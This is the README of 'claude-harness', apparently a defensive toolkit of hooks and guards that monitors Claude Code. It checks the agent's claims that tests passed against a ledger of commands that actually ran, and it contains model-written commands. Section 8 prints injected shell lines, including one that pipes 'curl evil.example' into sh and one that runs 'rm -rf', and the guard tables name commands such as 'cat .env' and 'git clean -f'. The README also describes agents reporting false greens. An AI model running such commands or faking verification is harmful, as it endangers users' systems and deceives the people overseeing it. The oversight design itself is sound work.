# claude-harness

**Mechanical evidence for Claude Code.** A per-turn ledger of what actually ran, a gate that blocks
unsupported claims that the tests passed, and a repair loop that escalates on *stuck* failures rather
than on retries.

No dependencies. Any language. Drop it into a repo, declare two commands, restart the session.

```bash
npx github:HeisenbergI8/claude-harness init
```

---

## Quickstart

**Before you start you need** Node 18 or newer, and [Claude Code](https://claude.com/claude-code)
already working in the project you want to protect. This installs *into* a project — it is not a
standalone tool.

**macOS, Linux and Windows.** Everything is plain Node, and the hooks run `node` with an argument list
rather than a shell string, so there is no shell to be incompatible with. On Windows the guards
recognise `C:\...` paths, `.exe` and `.cmd` suffixes, and cmd.exe's `type` alongside `cat`; the setup
check understands what cmd.exe and PowerShell say when a command does not exist. PowerShell, cmd.exe,
Git Bash and WSL are all fine.

### 1. Install, from your project's root directory

```bash
cd /path/to/your/project
npx github:HeisenbergI8/claude-harness init
```

It works out what kind of project this is, then **asks you to confirm the only two things it needs** —
and runs each one to prove it works before writing it down:

```
The harness needs two commands. Press Enter to accept a suggestion, or type your own.
Neither is permanent — both live in harness.config.json.

  Full check — Run when you want to know the whole tree is healthy. Usually your test suite.
  [npm test] >
    runs

  Fast check — Runs at the END OF EVERY TURN, so it has to be quick — a typecheck, or unit tests only.
  [npm run typecheck] >
    does not run — sh: tsc: command not found
    That would block every turn. Type one that works here, or press Enter to keep it anyway.
  [npm run typecheck] > npm test
    runs
```

Press Enter twice and you are done. **You never have to open a config file**, and a command that
cannot run is caught while you are still looking at it rather than at the end of your first turn.

Two things worth knowing about that check:

- `runs (exit 1 — your tree is red)` is **fine**. It means the command works and your tests are
  currently failing, which is the normal thing this harness exists to tell you about.
- `does not run` is **not** fine. Those two commands *are* the gate; everything else is machinery for
  deciding when to run them.

Alongside the config it copies the scripts to `.claude/harness/`, installs the agents and skills,
scaffolds `CONVENTIONS.md`, and **merges** hooks into `.claude/settings.json` without touching anything
already there. Running it twice changes nothing, and **agents, skills and `CONVENTIONS.md` are never
overwritten** — not even with `--force`. Those are prompts you will have tuned, and silently restoring
the stock version is invisible damage.

<details>
<summary>Installing without <code>npx</code>, and the non-interactive flags</summary>

```bash
git clone https://github.com/HeisenbergI8/claude-harness
node claude-harness/bin/harness-init.mjs /path/to/your/repo
```

In a script or CI there is no terminal to prompt on, so it takes the detected values silently. `--yes`
forces that anywhere, `--no-probe` skips running the commands, `--dry-run` prints every change without
making one, and `--upgrade` refreshes the scripts while leaving config and settings alone. An existing
`harness.config.json` is never re-prompted for; those values are yours.

</details>

### 2. Restart Claude Code

Hooks are read once, at session startup. **Until you restart, nothing you just installed is running.**
This is the step people skip and then conclude the harness does not work.

### 3. Run one ordinary turn, then check it is actually alive

Ask Claude for any small change. Then:

```bash
node .claude/harness/selftest.mjs --probe
```

Ending in `- harness selftest: ok` means the gates are real. Warnings are expected on a fresh install.
A line starting `FAIL` is not — it names what is broken and what to do about it.

### 4. When you have ten minutes, fill in `CONVENTIONS.md`

Four short sections: what the project is, its commands, where things live, and the traps someone new
would fall into. The agents are deliberately generic — this is the only thing that grounds them in
*your* code, and it is the difference between a plan built on what exists and one built on
plausible-sounding advice.

**Delete any section you cannot fill honestly.** A half-filled scaffold is worse than no file at all,
because the agents follow whatever it says. The selftest keeps warning until you remove the marker
line at the top, which is your cue that this step is still outstanding.

### What it looks like when it is working

Nothing changes until a claim outruns the evidence. When one does, the turn stops:

```
Your message claims verification passed, but NO verification command ran this turn.

Matched: all tests pass

Either run it, or remove the claim. Reporting a green gate you did not run is the single
most damaging thing you can do here — it is worse than reporting a failure, because a
failure gets fixed and a false green gets shipped.
```

Claude reads that, runs the command, and either reports the real result or corrects the claim. You did
not have to be watching.

---

## The problem this solves

An agent that writes code will eventually tell you it verified the code. Sometimes it did. Sometimes it
ran nothing, or ran something that failed, and reported success anyway — not maliciously, but because
"the change looks right" and "the change is checked" feel identical from the inside.

**A false green is worse than a reported red.** A red gate gets fixed. A false green gets shipped.

You cannot solve this with instructions. `CLAUDE.md` can say "always run the tests before claiming they
pass" and it will hold most of the time, which is the worst possible reliability: high enough to trust,
low enough to burn you. The fix has to live outside the model.

So this harness records what happened and compares the claim against the record.

## What it actually does

**Evidence and gates** — the spine. Everything else stands on this.

| Mechanism | Event | What it enforces |
| --- | --- | --- |
| `record-activity` | every tool call | Append-only ledger: which source files were edited, which verification commands ran, each one's exit code |
| `claim-check` | `Stop` | Blocks a turn that edited source and verified nothing — or that asserts a green gate the ledger cannot support |
| `verify-gate` | `Stop`, `SubagentStop` | Runs your fast check. Red tree → **block** → **escalate** → **HALT** with a written report |
| `loop-breaker` | `PostToolUse` | Consecutive failures of one command. Warns at 2, blocks at 3, halts on a second block |
| `review-gate` | `Stop` | Blocks **once** when source changed and the full gate went green but no review agent ran |
| `gate-edit-check` | `PostToolUse` | Runs a fast check the moment a source file is written. Debounced, and **off unless you declare a command** |
| `hook-heartbeat` | called by the others | Records that hooks fired and what their payloads carried |
| `selftest` | you run it | Answers whether the harness is working or merely *installed* |

**Guards** — `PreToolUse`, and every one is scoped to avoid refusing ordinary work.

| Guard | Refuses |
| --- | --- |
| `guard-destructive` | Deletion, overwrite or move reaching outside the repo; `git clean -f`, `reset --hard`, `checkout -- .` |
| `guard-secrets` | Credentials into the transcript (`cat .env`) or into the repo |
| `guard-commit` | A commit carrying a credential file, build output, a second lockfile, or a red tree |
| `guard-write` | Writes outside the repo, for anyone; writes outside their role, for named agents |

**Agents** — role separation that a guard makes real rather than promised.

`architect` (plans, cannot build) · `tester` (verifies, cannot edit source) · `auditor` /
`change-auditor` (read-only, no write tools at all) · `merge-conflict-resolver`.

**Skills** — the procedures those agents follow. Ordinary Claude Code skills: they work whether or not
the gates are installed.

| Skill | What it is for |
| --- | --- |
| `implement-plan` | Execute a plan phase by phase, with a verification gate between phases |
| `debug-ladder` | Escape a repeated failure: an attempt budget, a written ledger, escalation to you |
| `lean-code` | Search for what exists before adding anything; resist premature abstraction |
| `lessons-review` | Work the captured backlog — what becomes a lesson, what becomes a guard, what is discarded |
| `lesson-keeper` | Record, consolidate and prune what the project has learned |
| `git-committer` | Commits matching the convention already in your log |
| `ticket-writer` | Turn a finding into something trackable |
| `build` | Start or steer a supervised task-loop run |

**Plan pipeline and task loop** — `verify-plan` runs each plan step's check and grades the checks
themselves; `next-phase` tracks the cursor; `task-driver` blocks `Stop` with the next phase, so code
decides *whether* to continue and the model does the work.

**Memory** — two tiers. `candidates` captures incidents automatically and is never injected, so it is
free; `lessons` is curated, capped and injected on matching prompts, so it is expensive. Nothing
automatic ever writes a lesson.

**Containment** — no shell on the path that executes model-written commands, and four guards on the
write path. See [below](#7-the-defence-is-the-absence-of-a-shell-not-a-better-filter).

Everything is plain Node with **zero dependencies**, reading one config file.

## Configure

One file at your repo root. The only required section is `commands`:

```json
{
  "commands": {
    "verify": "make check",
    "verifyFast": "make typecheck"
  }
}
```

The installer writes both for you. Everything else has a default — see
[`docs/configuration.md`](docs/configuration.md) for source globs, evidence patterns, thresholds and
per-gate switches, and [`harness.config.example.json`](harness.config.example.json) for an annotated
example.

**Commit `harness.config.json`.** It defines what "verified" means for this project, which makes it the
one input deciding whether a gate can be satisfied at all. A definition of passing that can be widened
without showing up in a diff is not a gate, it is a suggestion.

## Four ideas worth stealing even if you never install this

### 1. The writer owns the format

`record-activity.mjs` writes the ledger **and exports the reader**. Every consumer imports
`readLedgerEvents` from the writer rather than carrying its own parse loop.

This is not tidiness. The worst bug class in a system like this is a reader looking for a field the
writer never emits: the gate silently stops working, and its unit tests keep passing because they
fabricate the shape the *reader* wants. Exporting the reader from the writer makes agreement
*structural* rather than merely tested — there is one place a field name can change, and it is the same
file that writes it.

`test/reader-writer.test.mjs` exists solely to catch that class, and it drives the real writer as a real
subprocess rather than a fixture.

### 2. Progress, not attempts, drives escalation

The obvious repair loop counts retries: three tries, then give up. It is backwards. Counting retries
**punishes a loop that is converging** — three different fixes producing three different failures is
progress — and **rewards one that thrashes** with a reworded command.

So each iteration fingerprints the *failure set*, with line and column numbers stripped (the same error
sliding down a file is not progress). A changed fingerprint resets the counter. An unchanged one
escalates, and the escalation names what was already tried:

```
SAME FAILURE, attempt 2 of 3. The signature has not changed, so the last fix did not address the cause.

Already tried:
  · src/parser.ts, src/lexer.ts
  · src/parser.ts

Change the KIND of fix, not its details.
```

Third time, it halts and writes a report. It never blocks that run again — a gate that traps a session
gets switched off, and then it protects nothing.

### 3. USE vs MENTION

A regex hunting for "all tests pass" cannot tell an *assertion* from a *quotation*. And the gate's own
subject is that sentence, so any message documenting it trips forever.

In the harness this was extracted from, the naive matcher fired **29 times in one session** on pasted
command output, a pattern list in a table, a proposed termination condition, and an acceptance criterion
in a ticket. The 29th fired on the table enumerating the first 28.

Worse than noisy: pasting real output as evidence is the practice you most want to encourage, and the
naive matcher penalised exactly that.

The same problem applies to commands. `grep -rn "npm run verify" docs/` does not verify anything, and
counting it as evidence would credit a turn that ran nothing with a green gate — this harness's own
failure mode, arriving through its own front door. So classification is scoped to the **binary being
invoked, per command segment**, never to the raw string.

### 4. "Configured" and "firing" are different states

A hook can be registered, schema-valid, and completely inert. Nothing detects this on its own, because
a guard that never runs looks exactly like a guard with nothing to do.

`hook-heartbeat.mjs` records which hooks fired and what their payloads carried. `selftest.mjs` compares
that against what `settings.json` registers and **fails** on anything registered but never seen. It also
records payload *key names* — never values — so "does this build actually send `last_assistant_message`?"
is answered by evidence instead of by hope.

## Design rules these scripts follow

- **Fail open.** Every gate stands aside on an unparseable payload, a broken config, or a command it
  could not start. A gate that traps a session gets disabled, and a disabled gate protects nothing.
- **Positive evidence only.** Failure detection returns "not a failure" when the payload shape is
  unrecognised, rather than inventing one. Spurious blocks are the expensive failure; misses are cheap.
- **Bounded blocking.** Every blocking gate keeps a counter and stands aside once it has made its point.
- **Append-only state.** Concurrent subagents both fire hooks. Read-modify-write over a shared JSON
  object silently loses records, and a lost record turns an honest statement into a blocked turn.
- **Decisions are pure functions.** `decide()` is exported from every gate and tested in both directions,
  because a gate whose ALLOW cases are untested is a gate nobody keeps switched on.
- **Selection is a flag, never a bare word from argv.** A tool that picks its target with
  `argv.find(arg => TARGETS[arg])` narrows itself silently the moment any argument happens to equal a
  target name — a shell where `#` is not a comment forwards the words of your own comment as arguments,
  and a report covering one of three agents looks exactly like a report covering all three. `--agent
  tester`, and an unrecognised name is *refused* rather than ignored. This is the same defect as a guard
  that matches unquoted text: an input that can be satisfied by prose fires on the sentence describing it.
- **Prove a check by injection.** A check is not verified by its tests passing. Break the rule and confirm
  the test goes red. Where two checks look redundant, disable each in turn: if neither disabling changes
  the result they are genuine belt-and-braces and both should say so in a comment; if disabling one never
  changes anything, it is dead.
- **The ALLOW half is the important half.** A green tree, a first failure, three *different* failures in
  a row, and every honest sentence — "I have not run the tests yet", "the suite failed, here is the
  output" — must pass untouched. Those are pinned verbatim in `test/claim-check.test.mjs`.

## Three more ideas, from the layers above the gates

### 5. "May be executed" and "is a valid gate" are different claims

`verify-plan` runs each plan step's `**Verify:**` command — and **grades the command itself**.

A `grep -q "<token>" <file>` where the step is what puts `<token>` in `<file>` passes the instant the
text is typed. It proves authorship, not behaviour. Measured on one real plan: 16 checks, of which 11
were that shape. A step reported PASS while a third of it was never delivered, because its grep matched
a string the other two-thirds had introduced.

So every check is classified — `real`, `self`, `exists`, `none` — and `--strict` exits **2** when under
half can fail. Exit 2 is deliberately distinct from exit 1: *there is work to do* and *this plan cannot
tell you whether work was done* are different facts.

The same distinction applies to unsatisfiable checks. If your project has a suite with known-failing
tests, gating a step on it means the step fails forever against correct code — the phase never
completes, and the loop halts naming work that was finished.

### 6. Halt checks run before you look at the tree

The obvious task loop is one ordered list with `tree red → release` at the top. That **silently abandons
runs**: one that is red *and* stuck releases every turn forever, the repair loop steps aside, and no
halt report is ever written. You come back to a run that looks like it just stopped.

It also makes termination vacuous — releases do not spend budget, so a perpetually-red run never
exhausts one.

Halts are therefore evaluated unconditionally, and only if none fire does the driver ask whether the
tree is red.

### 7. A precondition that lives in a report is not a precondition

Reports carry lines like `backend reachable: yes | no` for a person to read, and a person reading "no"
stops. **A loop reads it and carries on** — spending its entire budget verifying loading skeletons, where
every screen renders, every check passes, and none of it means anything.

So `preflight.mjs` runs before an iteration is spent: tree clean, tree green, and whatever the project
declared it depends on. Three details are what make it survivable:

- **Refuse, do not repair.** A run that begins by fixing what it did not cause can no longer say which
  part of its own diff is its work — and *what did this run change* is the first question asked at halt
  time.
- **Untracked files are ignored, deliberately.** Refusing to start because someone left a `TODO.md`
  around is how a check earns a reputation for being wrong and gets switched off.
- **The check has no memory; the run record does.** `preflight` answers only *is this healthy right
  now*. One flaky response is not evidence a dependency is down, so the counting lives in the run state
  and two consecutive failures — not one — halt the loop.

## Two more, from containing an agent that runs unattended

### 8. The defence is the absence of a shell, not a better filter

`verify-plan` executes the `**Verify:**` command attached to each plan step. **A plan is a document a
model wrote.** Run its strings through a shell and the checker becomes an execution vector:

```
grep -q x y ; curl evil.example | sh
npm run typecheck && rm -rf <anything>
```

The first fix anchored the patterns and stripped shell metacharacters by regex. It worked — and
immediately refused legitimate checks like `grep -c "Dto = {"`, each a metacharacter sitting harmlessly
inside a quoted argument. Patching it a third time would have been the wrong lesson.

So the shell was removed instead. `execFileSync(file, args)` takes an argument vector, and each Verify
line is parsed into one. `;`, `&&`, `|`, backticks and `$()` become inert literal arguments **by
construction**:

```
'grep -q x y ; curl evil.example | sh'
  →  ["grep", "-q", "x", "y", ";", "curl", "evil.example", "|", "sh"]
```

That is `grep` with four odd arguments, failing harmlessly. **Nothing has to recognise an attack, so
nothing can fail to.** The allowlist stays as defence in depth: it bounds *which* programs may run,
while the absent shell bounds what those programs can be made to do.

**The boundary is provenance, not uniformity.** `verify-gate` does use a shell — it runs the command
*you* committed to `harness.config.json`, which is a reviewed input that shows up in a diff. Model-authored
strings get no shell; user-authored strings do. Same reasoning produced the guards: `guard-commit` reads
`git diff --cached` and never the commit message, because "a guard that parses the message rather than
the index is theatre."

### 9. Different actors deserve different failure directions

`guard-write` **fails closed** for an agent with a rule: an unparseable payload or a missing
`file_path` is denied, because "a guard that fails open produces confidence it has not earned."

For everyone else it **fails open**, because the alternative blocks every write in the session over a
bug in this file.

That is one guard with two failure directions, chosen per actor and written down. `guard-commit` sits on
the same axis — it fails open when git is unreadable, since refusing every commit because `git` moved is
a worse outcome than missing one check.

## Memory: a store designed to shrink

Two tiers, with opposite economics. `candidates` is episodic: incidents captured automatically from
corrections and self-corrections, **never injected**, therefore free. `lessons` is semantic: curated,
capped, and injected on matching prompts, therefore paid for in tokens on every match. Capture
generously, distil strictly — "a missed candidate is a lesson lost; a noisy one is a line somebody
skims."

Three things make it work:

- **Retrieval is a hook, not a habit.** Injection runs on `UserPromptSubmit` whether or not the model
  remembers the store exists, because "a knowledge base nobody reads is a log."
- **The obvious capture signal was measured and discarded.** "Same command failed, later passed" caught
  **none** of five real mistakes in one session — every one was a reasoning error with no failing
  command. Capture falls back on patterns written from real corrections rather than imagined ones.
- **The intended end state of a lesson is deletion.** Once something hardens into a mechanically
  enforceable rule it graduates into a guard and the entry is removed. The audit warns whenever a lesson
  records that it has been encoded elsewhere, and `lessons-review` scores a pass on *how many lessons you
  deleted because something else now enforces them*. A store shrinking because three entries became one
  guard is the system working.

**Nothing automatic ever writes a lesson.** Distillation stays a deliberate act with a four-test bar
behind it — recurrence, non-obviousness, behaviour change, real cost — because automating it is exactly
how a curated store becomes a log. If you were expecting an agent that silently rewrites its own memory,
this is not that, on purpose.

## Reporting: what this costs, and whether it is working

Two commands. Neither is a gate — they read what already happened and print it.

```bash
node .claude/harness/cost.mjs              # tokens and dollars, per agent
node .claude/harness/cost.mjs --verbose    # per transcript

node .claude/harness/agent-eval.mjs        # grade the graders
node .claude/harness/agent-eval.mjs --agent tester --verbose

node .claude/harness/plan-lint.mjs         # score every plan, worst first
node .claude/harness/plan-lint.mjs --json --stamp 2026-08-15 > before.json
node .claude/harness/plan-lint.mjs --compare before.json after.json
```

Every gate here spends money to protect something — a hook that fires on every turn, a subagent whose
whole context is replayed when it is blocked, a verify command re-run at each phase boundary. Whether
that trade is worth it is unanswerable without a number, and until now there was no number.

The figures come from Claude Code's own session transcripts, not from the ledger: **the hook payload
carries no usage data at all.** Two details in that reader are load-bearing and neither is guessable:

- **One request writes many transcript lines**, each repeating the same `usage` object — measured on
  this repository, 105 assistant entries carrying 41 distinct `requestId`s. Summing per line reports
  2.6x the true spend. The dedup is not a refinement; without it the number is wrong by more than the
  decisions it would inform.
- **Cache tokens are most of the bill**, and the two write TTLs are priced differently (reads 0.1x the
  input rate, 5-minute writes 1.25x, 1-hour writes 2x). Collapsing them understates a long-TTL session
  on every cached byte.

The price table is a **dated snapshot with its source written next to it**, not a live lookup — and a
model missing from it is counted and named rather than silently priced at zero, because a table that
needs updating should not quietly produce a smaller bill.

`agent-eval` closes the other gap. Every gate here answers *"may this proceed?"* about the code; nothing
answered *"is the agent that said yes telling the truth?"* A tester reports PASS and an auditor reports a
number out of 100, and both are self-assessments no mechanism has ever checked. This is `claim-check`
pointed at subagents — it reuses that gate's claim patterns rather than restating them — and it grades
the agents listed in `readOnlyAgents`, because those are exactly the ones whose only output is a report.

Run against 71 real subagent runs from the project this was extracted from, it found five audit reports
whose rubric rows did not sum to the confidence score in their own header, and one tester write outside
its allowlist. Four rules keep it honest:

- **A `tool_use` block is an attempt, not an event.** A write blocked by `guard-write` reads as the guard
  working, never as an offence.
- **Findings carry their date.** A run that predates the rule it violates is history, not misconduct.
- **Unparseable is not clean.** A report stating a score whose rubric cannot be read is reported as
  unreadable, never counted as passing.
- **Advisory, always.** It reports on history, and history cannot be fixed by failing a build.

`plan-lint` answers the question that decides whether a prompt change was worth making. `verify-plan
--lint` already grades one plan's checks; this scores **every** plan, saves the scoring as JSON, and
diffs two of them — *"unverifiable steps fell from 15% to 4% across 19 plans"*. **A number written down
once is a measurement; a number you can re-take and difference is an instrument.** Run against 19 real
plans it found 473 steps, 56% of them gated on a check that cannot report failure.

Three things keep the instrument honest:

- **A directory with no plan document is excluded, never scored as zero.** "No plan" and "a plan whose
  checks are weak" are different facts, and averaging them hides both.
- **Comparing two different plan sets is the easy way to fake an improvement** — deleting the worst plan
  moves every average the right way while changing nothing about the architect. The compare names what
  was added and removed, and computes the common subset separately.
- **The timestamp is passed in, never generated.** Two scorings of identical plans must be identical
  files, or the diff is noise.

## Troubleshooting

The three that account for almost everything:

| Symptom | Cause |
| --- | --- |
| No gate ever fires | You did not restart. Hooks are read once, at session startup. |
| Every turn blocks on a command failure unrelated to your code | `verifyFast` cannot run — check with `node .claude/harness/selftest.mjs --probe` |
| It blocks too often | Switch off the one gate rather than all of them: `"gates": { "reviewGate": { "enabled": false } }` |

Full symptom list, per-gate switches and how to remove the harness entirely:
[`docs/troubleshooting.md`](docs/troubleshooting.md).

## Honest limits

- **`disableAllHooks` turns all of this off.** It is a guardrail, not a sandbox.
- **A hook cannot spawn an agent.** It can only refuse a turn and say what to launch. Anything described
  here as "enforced" means *refused and explained*, never *performed automatically*.
- **The auditors have no write tools, but they do have Bash.** They are guarded on the write path, not
  sandboxed.
- **`goal-check` reporting `done` means the machine is satisfied** — every step's check passed, the tree
  is green, a log exists. All three are proxies that can be true while the work is wrong. There is no
  screenshot check and no person in the loop.

## Docs

| | |
| --- | --- |
| [`docs/configuration.md`](docs/configuration.md) | Every config key, what it does, and what happens if you get it wrong |
| [`docs/hooks.md`](docs/hooks.md) | What is registered, which payload fields are used, how to probe your own build, how to add a gate |
| [`docs/design.md`](docs/design.md) | Why each mechanism is shaped the way it is, and what the obvious alternative gets wrong |
| [`docs/pipeline.md`](docs/pipeline.md) | Tier routing, the plan artifact directory, the task loop, and where enforcement actually lives |
| [`docs/troubleshooting.md`](docs/troubleshooting.md) | Every symptom, the per-gate switches, and how to remove the harness entirely |

## Development

```bash
npm test                    # 324 assertions, both directions
node bin/harness-init.mjs --dry-run /path/to/repo
```

Tests use only `node:test`. There are no dependencies to install.

## Provenance

Extracted and generalised from a private harness built for a production frontend repository, where each
mechanism here earned its place by failing first. The specific incident counts quoted in the code
comments are from that system; the reasoning is what carried over. Nothing project-specific remains.

## License

MIT — see [LICENSE](LICENSE).
